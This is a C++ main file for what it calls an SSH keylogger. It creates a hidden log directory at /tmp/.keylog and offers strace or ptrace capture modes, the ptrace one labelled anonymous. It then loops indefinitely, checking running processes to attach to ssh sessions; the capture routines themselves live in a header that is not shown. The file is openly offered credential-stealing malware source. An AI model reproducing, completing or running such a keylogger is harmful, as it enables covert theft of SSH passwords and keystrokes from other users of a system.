#include "keylogger.hpp"

namespace po = boost::program_options;

int main(int argc, char **argv) {
    const fs::path path_to_log = "/tmp/.keylog";
    int64_t sleep_time = 3;
    if(!fs::exists(path_to_log)){
        fs::create_directories(path_to_log);
        std::cout << "DIR is created" << std::endl;
    }

    options_description desc{"Options"};
    desc.add_options()
            ("help", "print all support info")
            ("strace,s", "run ssh keylogger via STRACE mechanism(no anonymuous, default option)")
            ("ptrace,p", "run ssh keylogger via PTRACE mechanism(anonymuous)");

    po::variables_map vm;
    po::store(po::parse_command_line(argc, argv, desc), vm);
    po::notify(vm);

    if (vm.count("help")) {
       std::cout << desc << std::endl;
        return 1;
    }

    while(true){
        if (vm.count("strace,s")) check_ps(1);
        else check_ps(0);
        std::this_thread::sleep_for(std::chrono::seconds(sleep_time));
    }
}